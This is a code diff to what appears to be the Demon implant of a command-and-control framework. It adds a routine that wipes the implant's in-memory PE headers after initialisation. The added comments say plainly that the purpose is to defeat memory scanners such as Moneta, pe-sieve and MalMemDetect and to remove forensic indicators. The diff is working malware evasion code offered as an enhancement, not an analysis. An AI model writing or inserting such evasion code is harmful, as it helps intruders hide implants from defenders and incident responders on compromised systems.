@@ -597,6 +597,44 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     }
 
     PRINTF( "Instance DemonID => %x\n", Instance->Session.AgentID )
+
+    /* ---------------------------------------------------------------
+     * PE Header Wipe — erase DOS header + NT headers from memory.
+     *
+     * After DemonInit completes, ModuleBase and ModuleSize are cached
+     * in Instance->Session so the PE headers are no longer needed.
+     * Wiping them removes a major forensic/scanning indicator:
+     * memory scanners (Moneta, pe-sieve, MalMemDetect) look for
+     * valid MZ/PE signatures in private executable memory regions.
+     *
+     * We zero both IMAGE_DOS_HEADER and IMAGE_NT_HEADERS to eliminate:
+     *   - "MZ" magic (0x5A4D) at base address
+     *   - "PE\0\0" signature (0x4550)
+     *   - All optional header metadata (entry point, section table, etc.)
+     *
+     * RtlSecureZeroMemory is used to prevent compiler optimization
+     * from eliding the writes (volatile semantics).
+     * --------------------------------------------------------------- */
+    if ( Instance->Session.ModuleBase )
+    {
+        PIMAGE_DOS_HEADER pDosHdr = ( PIMAGE_DOS_HEADER ) Instance->Session.ModuleBase;
+        DWORD             ntOff   = pDosHdr->e_lfanew;
+
+        /* Validate e_lfanew is sane before dereferencing — guard against
+         * corrupted or already-wiped headers on re-entry edge cases */
+        if ( ntOff > sizeof( IMAGE_DOS_HEADER ) && ntOff < 0x400 )
+        {
+            PIMAGE_NT_HEADERS pNtHdrs = ( PIMAGE_NT_HEADERS ) ( ( PBYTE ) Instance->Session.ModuleBase + ntOff );
+
+            /* Wipe NT headers first (while e_lfanew still points to them) */
+            RtlSecureZeroMemory( pNtHdrs, sizeof( IMAGE_NT_HEADERS ) );
+            PUTS( "PE NT headers wiped" )
+        }
+
+        /* Wipe DOS header (includes e_lfanew, MZ magic, etc.) */
+        RtlSecureZeroMemory( pDosHdr, sizeof( IMAGE_DOS_HEADER ) );
+        PUTS( "PE DOS header wiped" )
+    }
 }
 
 VOID DemonConfig()
